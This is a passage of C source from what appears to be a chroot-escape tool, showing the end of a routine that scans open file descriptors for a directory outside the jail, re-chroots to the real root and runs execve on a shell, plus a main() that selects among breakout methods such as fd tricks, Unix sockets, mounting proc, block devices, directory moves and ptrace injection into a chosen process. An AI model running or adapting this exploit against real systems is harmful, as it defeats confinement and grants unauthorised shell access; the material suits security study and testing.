    if ((dird = opendir(".")) == NULL)
    {
	printf("[-] error openening /etc: %s\n", strerror(errno));
    }

    printf("[+] looking for %s\n", dir);
    if ((err = stat(dir, &fdstat)) != 0)
    {
        printf("[+] %s is not created, creating one\n", dir);
        if (mkdir(dir, 0700))
        {
            printf("[-] error creating %s\n", dir);
            return 0xDEADBEEF;
        }
    }

    if (chdir(dir) != 0) 
    {
	printf("[-] error changing directort: %s\n", strerror(errno));
    }

    if (chroot(".") != 0) 
    {
	printf("[-] error chrooting: %s\n", strerror(errno));
    }

    size = getdtablesize();
    if (size == -1) size = OPEN_MAX;
    for (i = 0; i < size; i++)
    {
	if (fstat(i, &fdstat) == 0)
	{
	    if (S_ISREG(fdstat.st_mode)) printf("[!] %d: regular file\n", fd); 
	    if (S_ISDIR(fdstat.st_mode)) printf("[!] %d: directory\n", fd); 
	    if (S_ISCHR(fdstat.st_mode)) printf("[!] %d: character device\n", fd); 
	    if (S_ISBLK(fdstat.st_mode)) printf("[!] %d: block device\n", fd); 
	    if (S_ISFIFO(fdstat.st_mode)) printf("[!] %d: FIFO (named pipe)\n", fd); 
	    if (S_ISLNK(fdstat.st_mode)) printf("[!] %d: symbolic link\n", fd); 
	    if (S_ISSOCK(fdstat.st_mode)) printf("[!] %d: socket\n", fd); 

	    if (S_ISDIR(fdstat.st_mode)) 
	    {
		printf("[+] found a directory\n");
		if (fchdir(i) != 0) 
		{
		    printf("[-] fchdir error");
		    continue;
		}
		if (movetotheroot()) 
		{
		    printf("[-] chdir error");
		    continue;
		}
		if (chroot(".")) 
		{
		    printf("[-] chroot error");
		    continue;
		}
	        for (i=0; i<SHELLNUM; i++)
		{
		    if ((err = stat(shells[i], &fdstat)) == 0)
		    {
			return execve(shells[i], NULL, NULL);
		    }
		}
	    }
	}
    }
    
    return 0;

}
#endif

int main(int argc, char **argv)
{
#if !__NetBSD__
    int o, option_index = 0, method = -1;
    unsigned long long pid_arg = 0;
    unsigned int port_arg = 0;
    char *dir1_arg = NULL, *dir2_arg = NULL, *dir3_arg = NULL;
    opterr = 0;
    static struct option long_options[] =
	{
          {"help",   no_argument,       0, 'h'},
          {"0",   no_argument,       0, '0'},
          {"1",   no_argument,       0, '1'},
          {"2",   no_argument,       0, '2'},
          {"3",   no_argument,       0, '3'},
          {"4",   no_argument,       0, '4'},
          {"5",   no_argument,       0, '5'},
          {"6",   no_argument,       0, '6'},
#if __x86_64__
          {"7",   no_argument,       0, '7'},
#endif
          {"9",   no_argument,       0, '9'},
          {"pid",  required_argument, 0, 'p'},
          {"port",  required_argument, 0, 'P'},
          {"dir",  required_argument, 0, 'd'},
          {"nestdir",    required_argument, 0, 'n'},
          {"tempdir",    required_argument, 0, 't'},
          {0, 0, 0, 0}
        };
    while (1)
    {
	o = getopt_long(argc, argv, "012345679hp:P:d:n:m:", long_options, 
	    &option_index);
	if (o == -1) break;
	
	switch(o)
	{
	    case 'h':
		usage(argv[0]);
		break; 
	    case 'p':
		pid_arg = atoll(optarg);
		break;
	    case 'P':
		port_arg = atoi(optarg);
		break;
	    case 'd':
		dir1_arg = optarg;
		break;
	    case 'n':
		dir2_arg = optarg;
		break;
	    case 't':
		dir3_arg = optarg;
		break;
	    case '0':
		method = 0;
		break;
	    case '1':
		method = 1;
		break;
	    case '2':
		method = 2;
		break;
	    case '3':
		method = 3;
		break;
	    case '4':
		method = 4;
		break;
	    case '5':
		method = 5;
		break;
	    case '6':
		method = 6;
		break;
#if __x86_64__
	    case '7':
		method = 7;
		break;
#endif
	    case '9':
		method = 9;
		break;
	    case '?':
		if (!((optopt == 'p') || (optopt == 'P') ||
		    (optopt == 'd') || (optopt == 'n') ||
		    (optopt == 't')))
		    printf("[-] Unknown option: %c\n\n", optopt);
		else if (optopt == 'p')
		    printf("[-] Option pid requires a parameter\n\n");
		else if (optopt == 'P')
		    printf("[-] Option port requires a parameter\n\n");
		else if (optopt == 'd')
		    printf("[-] Option dir requires a parameter\n\n");
		else if (optopt == 'n')
		    printf("[-] Option nestdir requires a parameter\n\n");
		else if (optopt == 't')
		    printf("[-] Option tempdir requires a parameter\n\n");
		break;
	    default:
		usage(argv[0]);
		break;
	}
    }
    if (!argv[1]) 
    {
	usage(argv[0]);
	return 0;
    }
    switch(method)
    {
#if !__FreeBSD__ && !__OpenBSD__
        case 0:
            if (dir1_arg)
                return classic(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
#endif
#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__
        case 1:
            if (dir1_arg)
		return classicfd(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
#endif
#if !__OpenBSD__
        case 2:
            if (dir1_arg)
		return uds(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
#endif
#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && \
        !__APPLE__
        case 3:
            if (dir1_arg)
		return mountproc(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
#endif
#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && \
        !__APPLE__ && !__sun
        case 4:
            if (dir1_arg && dir3_arg)
		return makeblockdevice(dir1_arg, dir3_arg);
            else
                printf("[-] Missing argument: --dir or --tempdir\n\n");
            break;
#endif
        case 5:
            if (dir1_arg && dir2_arg && dir3_arg)
		return moveooc(dir1_arg, dir2_arg, dir3_arg);
            else
                printf("[-] Missing argument: --dir or --nestdir or --tempdir\n\n");
            break;
#if !__APPLE__ && !__sun && !__DragonFly__
        case 6:
            return ptracepid(pid_arg, 0, port_arg);
            break;
#if __x86_64__
        case 7:
            return ptracepid(pid_arg, 1, port_arg);
            break; 
#endif
#endif
#if __linux__
        case 9:
            if (dir1_arg)
		return fddemo(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
#endif
	default:
	    printf("[-] No method was chosen\n");
	    break;
    }
#else
    usage(argv[0]);
    return 0;
#endif
}
